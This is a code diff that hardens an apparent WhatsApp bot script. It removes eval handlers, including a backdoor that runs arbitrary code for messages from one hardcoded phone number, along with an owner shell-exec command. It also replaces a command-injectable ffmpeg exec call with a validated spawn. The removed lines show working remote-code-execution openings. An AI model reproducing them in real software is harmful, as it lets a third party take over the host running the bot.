@@ -253,25 +253,7 @@ var xeonytimewisher = `Good Morning 🌄`
 var xeonytimewisher = `Good Morning 🌄`
  } 
 
-		if (isEval && senderNumber == "916909137213") {
-			let evaled,
-				text = q,
-				{ inspect } = require('util')
-			try {
-				if (text.endsWith('--sync')) {
-					evaled = await eval(
-						`(async () => { ${text.trim.replace('--sync', '')} })`
-					)
-					m.reply(evaled)
-				}
-				evaled = await eval(text)
-				if (typeof evaled !== 'string') evaled = inspect(evaled)
-				await XeonBotInc.sendMessage(from, { text: evaled }, { quoted: m })
-			} catch (e) {
-				XeonBotInc.sendMessage(from, { text: String(e) }, { quoted: m })
-			}
-		}
-try {
+	try {
 const isNumber = x => typeof x === 'number' && !isNaN(x)
 const user = global.db.users[m.sender]
 if (typeof user !== 'object') global.db.users[m.sender] = {}
@@ -5107,27 +5089,7 @@ XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success },
 break
 case '>':
 case '=>':
-if (!XeonTheCreator) return XeonStickOwner()
-var err = new TypeError
-err.name = "EvalError "
-err.message = "Code Not Found (404)"
-if (!q) return replygcxeon(util.format(err))
-var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
-try {
-var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
-replygcxeon(txtes)
-} catch(e) {
-let _syntax = ""
-let _err = util.format(e)
-let err = syntaxerror(arg, "EvalError", {
-allowReturnOutsideFunction: true,
-allowAwaitOutsideFunction: true,
-sourceType: "commonjs"
-})
-if (err) _syntax = err + "\n\n"
-replygcxeon(util.format(_syntax + _err))
-}
-break
+return replygcxeon('Remote code execution has been disabled for security.')
 case 'pushcontact': {
     if (!XeonTheCreator) return XeonStickOwner()
       if (!m.isGroup) return replygcxeon(`The feature works only in grup`)
@@ -5888,28 +5850,29 @@ await XeonBotInc.sendMessage(from, {text:"reply #s to this image to make sticker
 }
 break
 case 'volume': {
-if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
-media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
-if (isQuotedAudio) {
-rname = getRandom('.mp3')
-exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
-fs.unlinkSync(media)
-if (err) return replygcxeon('Error!')
-jadie = fs.readFileSync(rname)
-XeonBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
-fs.unlinkSync(rname)
-})
-} else if (isQuotedVideo) {
-rname = getRandom('.mp4')
-exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
-fs.unlinkSync(media)
-if (err) return replygcxeon('Error!')
-jadie = fs.readFileSync(rname)
-XeonBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
-fs.unlinkSync(rname)
-})
-} else {
-replygcxeon("Send video/audio")
+if (args.length !== 1) return replygcxeon(`Example: ${prefix + command} 1.5`)
+const volume = Number(args[0])
+if (!Number.isFinite(volume) || volume < 0 || volume > 10) return replygcxeon('Volume must be a number between 0 and 10.')
+if (!isQuotedAudio && !isQuotedVideo) return replygcxeon("Reply to an audio or video message.")
+
+const media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
+const output = getRandom(isQuotedAudio ? '.mp3' : '.mp4')
+try {
+	await new Promise((resolve, reject) => {
+		const ffmpegProcess = spawn('ffmpeg', ['-y', '-i', media, '-filter:a', `volume=${volume}`, output])
+		ffmpegProcess.once('error', reject)
+		ffmpegProcess.once('close', (code) => code === 0 ? resolve() : reject(new Error(`ffmpeg exited with code ${code}`)))
+	})
+	const result = fs.readFileSync(output)
+	if (isQuotedAudio) await XeonBotInc.sendMessage(from, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
+	else await XeonBotInc.sendMessage(from, { video: result, mimetype: 'video/mp4' }, { quoted: m })
+} catch (err) {
+	console.log('Volume conversion failed:', err)
+	replygcxeon('Unable to adjust the volume.')
+} finally {
+	for (const file of [media, output]) {
+		if (fs.existsSync(file)) fs.unlinkSync(file)
+	}
 }
 }
 break
@@ -6336,17 +6299,23 @@ case 'myip': {
                 }
             }
             break
-            case 'lyrics': {
-if (!text) return replygcxeon(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
-XeonStickWait()
-const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
-const result = await lyricsv2(text).catch(async _ => await lyrics(text))
-replygcxeon(`
-*Title :* ${result.title}
-*Author :* ${result.author}
-*Url :* ${result.link}
+	            case 'lyrics': {
+	if (!text) return replygcxeon(`What lyrics are you looking for?\nExample usage: ${prefix}lyrics Coldplay - Yellow`)
+	XeonStickWait()
+	const [artist, title] = text.split(/\s+-\s+/, 2).map((part) => part.trim())
+	if (!artist || !title) return replygcxeon(`Use the format: ${prefix}lyrics Artist - Song title`)
+	let result
+	try {
+		const { data } = await axios.get(`https://api.lyrics.ovh/v1/${encodeURIComponent(artist)}/${encodeURIComponent(title)}`)
+		result = { author: artist, title, lyrics: data.lyrics }
+	} catch (_) {
+		return replygcxeon('Lyrics were not found. Check the artist and song title, then try again.')
+	}
+	replygcxeon(`
+	*Title :* ${result.title}
+	*Author :* ${result.author}
 
-*Lyrics :* ${result.lyrics}
+	*Lyrics :* ${result.lyrics}
 
 `.trim())
 }
@@ -6707,37 +6676,6 @@ replygcxeon(`Moderate Limit Wait A Moment.`)
 break
 
 default:
-
-if (budy.startsWith('<')) {
-if (!XeonTheCreator) return
-try {
-return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
-} catch (e) {
-m.reply(e)
-}
-}
-
-if (budy.startsWith('vv')) {
-if (!XeonTheCreator) return
-try {
-let evaled = await eval(budy.slice(2))
-if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
-await m.reply(evaled)
-} catch (err) {
-m.reply(String(err))
-}
-}
-
-if (budy.startsWith('uu')){
-if (!XeonTheCreator) return
-qur = budy.slice(2)
-exec(qur, (err, stdout) => {
-if (err) return m.reply(`${err}`)
-if (stdout) {
-m.reply(stdout)
-}
-})
-}
 
 if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
 let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
